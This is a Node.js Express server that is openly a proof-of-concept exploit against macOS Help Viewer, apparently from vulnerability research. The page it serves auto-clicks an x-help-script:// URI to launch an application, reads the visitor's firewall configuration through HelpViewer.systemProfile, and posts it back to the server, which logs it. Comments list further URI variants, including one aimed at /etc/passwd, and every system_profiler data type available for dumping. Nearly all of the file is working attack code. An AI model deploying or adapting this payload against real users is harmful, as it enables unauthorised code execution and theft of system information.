const express = require("express");
const app = express();
const fs = require("fs");
const path = require("path");
const https = require("https");
const key = fs.readFileSync(path.join(__dirname, "rootCA-key.pem"), "utf8");
const cert = fs.readFileSync(path.join(__dirname, "rootCA.pem"), "utf8");

const options = {
	key,
	cert
};

// All available system_profiler dataTypes for dump
// ["SPParallelATADataType","SPUniversalAccessDataType","SPSecureElementDataType","SPApplicationsDataType","SPAudioDataType","SPBluetoothDataType","SPCameraDataType","SPCardReaderDataType","SPComponentDataType","SPiBridgeDataType","SPDeveloperToolsDataType","SPDiagnosticsDataType","SPDisabledSoftwareDataType","SPDiscBurningDataType","SPEthernetDataType","SPExtensionsDataType","SPFibreChannelDataType","SPFireWireDataType","SPFirewallDataType","SPFontsDataType","SPFrameworksDataType","SPDisplaysDataType","SPHardwareDataType","SPHardwareRAIDDataType","SPInstallHistoryDataType","SPLegacySoftwareDataType","SPNetworkLocationDataType","SPLogsDataType","SPManagedClientDataType","SPMemoryDataType","SPNVMeDataType","SPNetworkDataType","SPPCIDataType","SPParallelSCSIDataType","SPPowerDataType","SPPrefPaneDataType","SPPrintersSoftwareDataType","SPPrintersDataType","SPConfigurationProfileDataType","SPRawCameraDataType","SPSASDataType","SPSerialATADataType","SPSPIDataType","SPSmartCardsDataType","SPSoftwareDataType","SPStartupItemDataType","SPStorageDataType","SPSyncServicesDataType","SPThunderboltDataType","SPUSBDataType","SPNetworkVolumeDataType","SPWWANDataType","SPAirPortDataType"]

//  "allhelp"
// "_helpViewer",
const payloadLink = `x-help-script://com.apple.machelp/scpt/OpnAppBndID.scpt?open,com.apple.calculator`;

// ?????????????
// `apple-help-content:///etc/passwd`;

// NOT recodnized
// `x-seaside:///etc/passwd`;

// WORKS TOO
// `x-help-action://openApp?bundleId=com.apple.сalculator`;

const payload = `
<body>
<style>
body {
	background: black;
	color: white;
}
</style>
<h1>@Metnew</h1>
<h2 id="result"></h2>
<script type="text/javascript">
		var a = document.createElement("a");
		a.href = "${payloadLink}";
		a.innerHTML = 'Click me!'
		document.body.appendChild(a);
		a.click();
		
		const result = HelpViewer.systemProfile(["SPFirewallDataType"])
		fetch('/system', {
			method:"POST", 
			body: JSON.stringify({data: result}),
			headers: {
				'Accept': 'application/json',
				'Content-Type': 'application/json'
			}
		})
		document.querySelector('#result').innerHTML = "Attacker knows your firewall details"
</script>
</body>
`;

app.use(express.json())
app.all("/system", (req, res) => {
	console.log('RECEIVED system_profiler output!')
	console.log(req.body.data)
	res.send('');
});

app.all("*", (req, res) => {
	res.send(payload);
});

https.createServer(options, app).listen(443);